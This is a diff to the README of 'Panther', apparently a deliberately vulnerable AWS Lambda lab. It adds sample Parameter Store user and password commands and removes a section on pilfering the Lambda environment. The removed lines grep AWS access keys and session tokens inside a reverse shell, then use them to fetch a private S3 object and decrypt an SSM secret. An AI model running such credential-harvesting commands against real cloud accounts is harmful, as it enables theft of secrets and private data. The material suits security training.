@@ -36,7 +36,8 @@ In addition to deploying the function, this will create a private S3 Bucket with
 To store a secret in the aforementioned Parameter Store path, run the following:
 
 ```bash
-aws ssm put-parameter --name /panther/YOUR_KEY --value YOUR_VALUE --type SecureString
+aws ssm put-parameter --name /panther/database/user --value "panther_user" --type SecureString
+aws ssm put-parameter --name /panther/database/password --value "RG9ncyBhcmUgb3VyIGxpbmsgdG8gcGFyYWRpc2UuIFRoZXkgZG9u4oCZdCBrbm93IGV2aWwgb3IgamVhbG91c3kgb3IgZGlzY29udGVudC4=" --type SecureString
 ```
 
 ## Testing in AWS
@@ -84,26 +85,6 @@ curl 'http://localhost:3000/api/Panther?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT
 ```bash
 go get -u golang.org/x/lint/golint
 npm run lint
-```
-
-## Pilfering the Lambda Environment
-
-### Retrieving Access Keys
-
-Within a Panther reverse shell session:
-
-```bash
-env | grep ACCESS
-env | grep AWS_SESSION_TOKEN
-```
-
-### Accessing Private Resources
-
-On your local machine, export the environment variables retrieved in the previous step and run the following commands:
-
-```bash
-aws s3 cp s3://panther-$BUCKET_SUFFIX/assets/panther.jpg .
-aws ssm get-parameter --name /panther/YOUR_KEY --with-decryption
 ```
 
 ## Serverless AWS NodeJS Template
